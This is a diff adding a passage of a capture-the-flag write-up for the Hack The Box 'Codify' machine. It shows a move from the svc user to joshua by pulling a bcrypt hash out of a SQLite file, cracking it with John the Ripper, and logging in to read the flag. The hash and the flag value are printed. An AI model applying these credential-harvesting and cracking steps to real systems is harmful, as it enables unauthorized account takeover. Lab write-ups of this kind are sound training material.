@@ -126,3 +126,124 @@ I SSH'd into the server as user svc:
 ssh svc@codify.htb -i id_rsa
 ```
 
+## Escalating Privileges to "Joshua" 
+
+Following the successful acquisition of initial access as the "svc" user on the Codify server, my focus shifted towards identifying pathways for privilege escalation. My goal was to secure access to the "joshua" user account, a presence I had detected during the enumeration phase of the server. This phase involved a meticulous exploration aimed at uncovering potential vulnerabilities and avenues for advancing privileges within the system.
+
+### Discovering the tickets.db File
+I started by thoroughly enumerating the file system. Buried within the web directory at /var/www/contact I noticed an interesting file named tickets.db.
+
+Examining it revealed it was a SQLite database file owned by the svc user I was currently running as:
+
+```bash
+
+svc@codify:/var/www/contact$ ls -la tickets.db
+-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.db
+
+```
+
+### Extracting Credentials with strings
+My next step was to extract any readable strings from the binary SQLite file using the strings utility:
+
+```bash
+
+svc@codify:/var/www/contact$ strings tickets.db
+
+SQLite format 3
+tabletickets
+...
+CREATE TABLE users ( 
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT UNIQUE, 
+        password TEXT
+    )
+...
+joshua
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+```
+This revealed a bcrypt password hash for the user joshua.
+
+
+### Decrypting the Hash with John the Ripper
+
+Armed with a password hash, my next objective was to decipher it using John the Ripper. The initial step involved saving the hash to a designated file:
+
+```bash
+echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
+```
+
+
+Continuing the decryption process, I invoked John the Ripper, specifying the bcrypt format, and employed the rockyou wordlist:
+
+```bash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+### User Switching via su
+
+Having obtained Joshua's credentials, I seamlessly switched users and elevated privileges using the su command:
+
+
+```bash
+┌─[linux-htb@parrot]─[~]
+└──╼ $ssh joshua@codify.htb
+The authenticity of host 'codify.htb (10.10.11.239)' can't be established.
+ECDSA key fingerprint is SHA256:uw/jWXjXA/tl23kwRKzW+MkhMkNAVc1Kwwlm8EnJrqI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'codify.htb,10.10.11.239' (ECDSA) to the list of known hosts.
+joshua@codify.htb's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jan 29 05:15:06 PM UTC 2024
+
+  System load:                      0.03271484375
+  Usage of /:                       64.4% of 6.50GB
+  Memory usage:                     30%
+  Swap usage:                       0%
+  Processes:                        280
+  Users logged in:                  1
+  IPv4 address for br-030a38808dbf: 172.18.0.1
+  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.239
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+```
+
+
+## Reading the User Flag
+Finally, as the joshua user I could read the protected user flag in /home/joshua/user.txt:
+
+
+```bash
+
+Last login: Mon Jan 29 16:42:57 2024 from 10.10.15.0
+joshua@codify:~$ ls
+lol.py  pattern.py  user.txt
+joshua@codify:~$ cat user.txt 
+a2c643332c56aa463f9df3cfd94da300
+
+```
+
+]
+
+The entire process of privilege escalation facilitated a seamless transition from my initial restricted access as "svc" to attaining full access under the "joshua" account, ultimately leading to the successful capture of the flag.
+
+## Root-Level Privilege Escalation
+
+Following the transition to the "joshua" user, my exploration persisted as I actively sought additional opportunities for privilege escalation. This quest aimed to further elevate access within the system.
